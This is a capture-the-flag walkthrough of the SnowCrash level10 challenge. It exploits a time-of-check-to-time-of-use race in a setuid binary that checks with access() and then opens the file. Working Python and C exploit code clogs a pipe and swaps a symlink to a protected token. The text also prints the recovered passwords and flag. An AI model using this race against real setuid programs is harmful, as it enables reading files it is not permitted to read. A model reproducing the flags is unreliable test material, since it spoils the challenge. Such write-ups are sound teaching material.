# Objective

As `level10`, the goal is to exploit a vulnerability to gain `flag10`'s privileges and read the flag, which is the password for `level11`.

The flag is gained through the command `getflag`, run as `flag10`.

```sh
level10@SnowCrash:~$ ll -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag*
```


# Content of home

```sh
level10@SnowCrash:~$ pwd
/home/user/level10

level10@SnowCrash:~$ ll
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 ./
d--x--x--x  1 root    users     340 Aug 30  2015 ../
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout*
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
-r-x------  1 level10 level10   675 Apr  3  2012 .profile*
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```


### File type

```sh
level10: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf7e21fb68568fa57d6317d0535b97d9fca66f841, not stripped

level10@SnowCrash:~$ file token 
token: regular file, no read permission
```


### Behavior

```sh
level10@SnowCrash:~$ ./level10 
./level10 file host
        sends file to host if you have access to it

```

What could be the host?

```sh
level10@SnowCrash:~$ strings level10 

# skipped lines 
%s file host
        sends file to host if you have access to it
Connecting to %s:6969 .. 

# skipped lines
```

```sh
level10@SnowCrash:~$ ss -nltp
State      Recv-Q Send-Q                                                         Local Address:Port                                                           Peer Address:Port 
LISTEN     0      128                                                                       :::4646                                                                     :::*     
LISTEN     0      128                                                                       :::4747                                                                     :::*     
LISTEN     0      128                                                                       :::80                                                                       :::*     
LISTEN     0      128                                                                       :::4242                                                                     :::*     
LISTEN     0      128                                                                        *:4242                                                                      *:*     
LISTEN     0      32                                                                 127.0.0.1:5151                                                                      *:*  
```

Let us open a listening socket on 6969 in another window and see...

```sh
level10@SnowCrash:~$ nc -kl 6969
```

```sh
level10@SnowCrash:~$ chmod 777 .
level10@SnowCrash:~$ cat > file
testing anything

level10@SnowCrash:~$ ./level10 file 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
```

We received:

```sh
level10@SnowCrash:~$ nc -kl 6969
.*( )*.
testing anything
```

Better.


# Resolution

```sh
level10@SnowCrash:~$ ltrace ./level10 file 127.0.0.1

__libc_start_main(0x80486d4, 3, 0xbffff854, 0x8048970, 0x80489e0 <unfinished ...>
access("file", 4)                                                                       = 0             # HERE
printf("Connecting to %s:6969 .. ", "127.0.0.1")                                        = 32
fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                                      = 0
socket(2, 1, 0)                                                                         = 3
inet_addr("127.0.0.1")                                                                  = 0x0100007f
htons(6969, 1, 0, 0, 0)                                                                 = 14619
connect(3, 0xbffff79c, 16, 0, 0)                                                        = 0
write(3, ".*( )*.\n", 8)                                                                = 8
printf("Connected!\nSending file .. "Connected!)                                        = 27
fflush(0xb7fd1a20Sending file .. )                                                      = 0
open("file", 0, 010)                                                                    = 4
read(4, "testing anything\n", 4096)                                                     = 17            # HERE
write(3, "testing anything\n", 17)                                                      = 17
puts("wrote file!"wrote file!)                                                          = 12


```

```sh
level10@SnowCrash:~$ ltrace ./level10 token 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff854, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                                                     = -1             # HERE
printf("You don't have access to %s\n", "token"You don't have access to token)         = 31
+++ exited (status 31) +++

```

Apparently, we fail at access.

> Linux kernel permission checks evaluate file access based on the Effective User ID (EUID) rather than the Real User ID (RUID), with the notable exception of the access() system call which intentionally checks the real user identity

We notice that after the `access`, `level10` tries and write into `stdout`. We know that `write` is a blocking system call.

What if the program checked the `access` permissions, then was stuck on the `write` operation? Could we have time to swap a fake file with the right Real User permission with the actual token, that is going to be opened through `open` as the Effective User?

We can create a TOCTOU (Time-of-Check to Time-of-Use) race condition.


```sh
level10@SnowCrash:~$ touch /tmp/accessible_file

level10@SnowCrash:~$ cat > exploit.py
# exploit code, see below

level10@SnowCrash:~$ python exploit.py 
stdout clogged
stdout unclogged
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
```

The race won: the listener receives the content of `token` instead of our harmless decoy file.

```sh
level10@SnowCrash:~$ nc -kl 6969
.*( )*.
woupa2yuojeeaaed06riuj63c
```

```sh
level10@SnowCrash:~$ su - flag10
Password: # woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

flag10@SnowCrash:~$ su - level11
Password: # feulo4b72j7edeahuete3no7c
level11@SnowCrash:~$ 
```

### Exploits

Two versions of the same race are given below: the Python script used above, and an equivalent C implementation. Both rely on the same idea: fill the pipe `level10` writes to so its `write()` call blocks right after the `access()` check succeeds, swap the checked path for a symlink to `token` while it's stuck, then drain the pipe so it resumes and unknowingly serves the protected file.

```py
#!/usr/bin/env python

import os
import time
import fcntl
import subprocess

PAGE_SIZE = 4096
F_SETPIPE_SZ = getattr(fcntl, "F_SETPIPE_SZ", 1031)
F_GETPIPE_SZ = getattr(fcntl, "F_GETPIPE_SZ", 1032)

my_link = "/tmp/accessible_file"
tmp = "/tmp/replacement"
good_FILE = "/home/user/level10/.profile"
token_FILE = "/home/user/level10/token"

def main():
    for symlnk in (my_link, tmp):
        try: # address OSError: [Errno 2] No such file or directory: '/tmp/accessible_file'
            os.unlink(symlnk)
        except OSError:
            pass

    os.symlink(good_FILE, my_link)
    read_end, write_end = os.pipe()

    capacity = fcntl.fcntl(write_end, F_SETPIPE_SZ, PAGE_SIZE)  # Shrink pipe capacity to one page.

    os.write(write_end, b"X" * capacity) # Fill the pipe
    print("stdout clogged")

    my_subprocess = subprocess.Popen(["./level10", my_link, "127.0.0.1"], stdout=write_end)

    os.close(write_end)
    time.sleep(1)

    if my_subprocess.poll() is not None:
        raise RuntimeError("process exited")

    os.symlink(token_FILE, tmp)
    # os.replace(tmp, my_link)
    os.rename(tmp, my_link)

    os.read(read_end, capacity) # Free the pipe.
    print("stdout unclogged")

    my_subprocess.wait()

    print(os.read(read_end, PAGE_SIZE))


if __name__ == "__main__":
    main()
```

The C version below does the same thing without relying on a separate Python process: it `dup2`s its own stdin/stdout, clogs the pipe directly, `fork`s, then lets the parent swap the symlink and release the pipe once the child (running `./level10`) is observed to be stuck on `write()`.

```c
#define _GNU_SOURCE

#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <limits.h>
#include <stdlib.h>
#include <sys/wait.h>

#define PIPSIZ 4096
#define TOTAL_FD 64

#define slot(i) (fds.arr[(i)++])
#define store_fd(fd) (slot(fds.cur) = (fd))
#define close_fd(idx) (close(fds.arr[(idx)]), fds.arr[(idx)] = -1);


struct open_fds {
    int arr[TOTAL_FD];
    int cur;
} fds = {};


/* Close fds at exit */
__attribute((destructor)) void close_fds() {
    for (int i = 0; i < fds.cur; ++i) {
        if (fds.arr[i] != -1) {
            close(fds.arr[i]);
            fds.arr[i] = -1;
        }
    }
}

/* Init fds before start */
__attribute__((constructor)) void init_fds() {
    for (int i = 0; i < TOTAL_FD; ++i) {
        fds.arr[i] = -1;
    }
}

/**
 * All fds are stored in the global fds structure.
 */

int main(int argc, char **argv, char **envp)
{
    (void)argc;
    ++argv;

    /**
     * Prepare the environment
     */

    /* Create pipe */
    int pip[2];
    if (pipe(pip) == -1) {
        return 1;
    }
    store_fd(pip[0]);
    store_fd(pip[1]);

    size_t pipsiz = fcntl(pip[0], F_SETPIPE_SZ, PIPSIZ);
    pipsiz = fcntl(pip[0], F_GETPIPE_SZ);

    /* Save stdin and stdout for later */
    int fd_stdin;
    if ((fd_stdin = fcntl(STDIN_FILENO, F_DUPFD_CLOEXEC, 0)) == -1) {
        return 1;
    }
    store_fd(fd_stdin);
    
    int fd_stdout;
    if ((fd_stdout = fcntl(STDOUT_FILENO, F_DUPFD_CLOEXEC, 0)) == -1) {
        perror("fcntl");
        return 1;
    }
    store_fd(fd_stdout);

    /* Replace stdin and stdout for the child */
    if (dup2(pip[0], STDIN_FILENO) == -1) {
        perror("dup3");
        return 1; 
    }
    close_fd(0);

    if (dup2(pip[1], STDOUT_FILENO) == -1) {
        perror("dup2");
        return 1; 
    }
    close_fd(1);

    /**
     * Start the exploit
     */

    /* Clog the pipe */
    unsigned char c = 0xff;
    for (size_t i = 0; i < pipsiz; ++i) {
        write(STDOUT_FILENO, &c, 1);
    }

    /* Fork */
    pid_t pid = fork();
    if (pid > 0) {

        /* Wait for the child to block on the clogged pipe */
        sleep(4);
        /* Swap the fake file with the actual token */
        unlink(*(argv + 1));
        if (symlink("./token", *(argv + 1)) == 0) {
            printf("symlink succeeded");
        } else {
            perror("symlink failed");
        }

        /* Unclog the pipe */
        unsigned char buf[BUFSIZ] = {};
        ssize_t rd = read(STDIN_FILENO, buf, BUFSIZ);

        int ret = 0;
        wait(&ret);
        
    } else if (pid == 0) {
        /* Execute ./level10 ./symlink 127.0.0.1 */
        execve("./level10", argv, envp);
        perror("execve failed");
        exit(2);

    } else {
        perror("fork failed");
        return 1;
    }

    return 0;
}
```

